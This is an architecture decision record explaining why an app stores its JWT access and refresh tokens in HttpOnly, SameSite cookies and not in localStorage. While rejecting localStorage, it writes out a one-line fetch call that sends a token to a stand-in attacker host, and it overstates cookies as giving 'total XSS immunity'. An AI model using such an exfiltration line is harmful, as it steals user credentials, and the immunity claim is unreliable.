# ADR 003: Cookie-Based Authentication with HttpOnly & SameSite over LocalStorage

* **Status:** Accepted
* **Deciders:** Architecture & Security Team
* **Date:** 2026-06-29

---

## 1. Context & Problem Statement

Single Page Applications (SPAs) communicating with REST and WebSocket backends must store authentication credentials (JWT access tokens and refresh tokens) across browser refreshes and network requests.

Storing credentials in client-side storage mechanisms (`window.localStorage` or `window.sessionStorage`) is a common pattern in tutorials, but introduces severe security vulnerabilities in modern web applications.

---

## 2. Decision

We mandate **HTTP-Only, SameSite, Secure Cookies** for all authentication credentials:
* **`syncra_access`**: Contains the workspace-scoped JWT access token (15-minute expiration).
* **`syncra_refresh`**: Contains the raw cryptographic refresh token string (7-day expiration).

```ts
// cookie.ts
res.cookie('syncra_access', accessToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  path: '/',
  maxAge: 15 * 60 * 1000,
});
```

Neither the access token nor the refresh token is ever made accessible to client-side JavaScript.

---

## 3. Alternatives Considered

### Alternative A: Storing JWT in `localStorage` with `Authorization: Bearer`
* **How it works:** Client stores JWT in `localStorage.setItem('token', jwt)` and attaches it via an Axios request interceptor (`headers['Authorization'] = 'Bearer ' + token`).
* **Why it was rejected (Critical Security Risk):**
  * **Vulnerability to XSS:** Any Cross-Site Scripting (XSS) vulnerability—introduced through a malicious npm dependency, unsanitized user markdown, or compromised external script—gives an attacker immediate read access to `window.localStorage`. An attacker can exfiltrate the token silently with a single `fetch('attacker.com?leak=' + localStorage.getItem('token'))`.
  * **Lack of Revocation Safeguards:** Once exfiltrated, an access token cannot be invalidated until its expiration time elapses.

### Alternative B: In-Memory Access Token + Refresh Token in Cookie
* **How it works:** Store the 15-minute JWT in a JavaScript variable in memory, and the refresh token in an `HttpOnly` cookie.
* **Why it was rejected:** Every browser page refresh or hard reload clears in-memory state, forcing an immediate synchronous `/auth/refresh` round-trip before any page route can render, resulting in visual flashes and complex multi-tab synchronization logic.

---

## 4. Consequences & Trade-offs

### Positive
* **Total XSS Immunity:** Even if an attacker executes arbitrary JavaScript on `syncra.app`, they cannot read `document.cookie` because the browser's engine strictly forbids JavaScript access to `HttpOnly` cookies.
* **Native WebSocket Handshake Support:** During the initial Socket.io WebSocket HTTP upgrade handshake, the browser automatically transmits HTTP-only cookies to the server. The WebSocket gateway can authenticate users without requiring explicit handshake query parameters or URL tokens (which leak into server access logs).
* **Automatic Expiration Handling:** The browser natively discards cookies once their `maxAge` expires.

### Negative / Trade-offs & Mitigations
* **CSRF (Cross-Site Request Forgery) Exposure:**
  Because cookies are automatically attached by the browser to outgoing requests, malicious third-party websites could attempt cross-origin requests on behalf of an authenticated user.
  * **Mitigation 1:** `SameSite: 'strict'` instructs modern browsers to withhold cookies on all cross-origin requests (including standard top-level navigation links from external sites).
  * **Mitigation 2:** Express API requires `Content-Type: application/json` for state-mutating methods (`POST`, `PUT`, `DELETE`), which triggers a CORS pre-flight `OPTIONS` check that rejects unauthorized origins before request bodies are processed.

